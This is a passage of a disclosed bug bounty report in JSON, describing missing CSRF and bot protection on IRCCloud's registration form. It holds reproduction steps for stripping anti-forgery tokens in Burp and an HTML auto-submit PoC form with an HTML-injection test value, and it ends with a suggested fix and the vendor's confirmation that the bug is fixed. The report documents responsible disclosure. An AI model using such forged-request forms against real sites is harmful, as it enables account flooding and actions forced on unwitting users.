agreed_on_going_public_at":"2014-04-14T20:00:04.513Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi there,\r\n\r\nI've discovered the following CSRF issue: There's no CSRF / Bot protection on the registration form. \r\n\r\n###Details\r\n\r\nAn attacker could automate the registration process to flood your database with invalid/useless accounts. He could also source the process out to his victims (CSRF).\r\n\r\n###Steps to reproduce\r\n- 1. Go to https://www.irccloud.com/\r\n- 2 . Turn on burp and submit the registration form\r\n- 3. Remove the \"token\" and \"_reqid\" parameter from the request body and forward it\r\n- 4. The account should be created succesfully.\r\n\r\nCSRF PoC:\r\n\r\n```\r\n\u003chtml\u003e\r\n  \u003cbody\u003e\r\n    \u003cform action=\"https://www.irccloud.com/chat/signup\" method=\"POST\"\u003e\r\n      \u003cinput type=\"hidden\" name=\"email\" value=\"tes3\u0026#64;internetwache\u0026#46;org\" /\u003e\r\n      \u003cinput type=\"hidden\" name=\"password\" value=\"fooobar\" /\u003e\r\n      \u003cinput type=\"hidden\" name=\"realname\" value=\"test\u0026quot;\u0026gt;\u0026lt;h1\u0026gt;foobar\u0026lt;\u0026#47;h1\u0026gt;\" /\u003e\r\n      \u003cinput type=\"hidden\" name=\"invite\" value=\"\" /\u003e\r\n      \u003cinput type=\"hidden\" name=\"org\u0026#95;invite\" value=\"\" /\u003e\r\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\r\n    \u003c/form\u003e\r\n  \u003c/body\u003e\r\n\u003c/html\u003e\r\n```\r\n\r\n###How to fix?\r\nEither validate the \"token\" parameter server side or use a CAPTCHA to fight bots. The latter would be the prefered fix in my opinion. \r\n\r\nYours sincerely,\r\nSebastian Neef","vulnerability_information_html":"\u003cp\u003eHi there,\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ve discovered the following CSRF issue: There\u0026#39;s no CSRF / Bot protection on the registration form. \u003c/p\u003e\n\n\u003ch3 id=\"details\"\u003eDetails\u003c/h3\u003e\n\n\u003cp\u003eAn attacker could automate the registration process to flood your database with invalid/useless accounts. He could also source the process out to his victims (CSRF).\u003c/p\u003e\n\n\u003ch3 id=\"steps-to-reproduce\"\u003eSteps to reproduce\u003c/h3\u003e\n\n\u003cul\u003e\n\u003cli\u003e1. Go to \u003ca title=\"https://www.irccloud.com/\" href=\"/redirect?url=https%3A%2F%2Fwww.irccloud.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.irccloud.com/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003e2 . Turn on burp and submit the registration form\u003c/li\u003e\n\u003cli\u003e3. Remove the \u0026quot;token\u0026quot; and \u0026quot;_reqid\u0026quot; parameter from the request body and forward it\u003c/li\u003e\n\u003cli\u003e4. The account should be created succesfully.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eCSRF PoC:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;html\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;form\u003c/span\u003e \u003cspan class=\"na\"\u003eaction=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://www.irccloud.com/chat/signup\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003emethod=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;POST\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;email\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;tes3\u0026amp;#64;internetwache\u0026amp;#46;org\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;fooobar\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;realname\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;test\u0026amp;quot;\u0026amp;gt;\u0026amp;lt;h1\u0026amp;gt;foobar\u0026amp;lt;\u0026amp;#47;h1\u0026amp;gt;\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;invite\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;org\u0026amp;#95;invite\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;submit\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Submit request\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/form\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch3 id=\"how-to-fix\"\u003eHow to fix?\u003c/h3\u003e\n\n\u003cp\u003eEither validate the \u0026quot;token\u0026quot; parameter server side or use a CAPTCHA to fight bots. The latter would be the prefered fix in my opinion. \u003c/p\u003e\n\n\u003cp\u003eYours sincerely,\u003cbr\u003e\nSebastian Neef\u003c/p\u003e\n","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2014-05-14T17:16:20.270Z","allow_singular_disclosure_after":-209136452.7355112,"singular_disclosure_allowed":true,"vote_count":0,"voters":[],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":30290,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks for the report!\n\nThis issue has now been fixed. The fact that the token wasn't being validated was because we we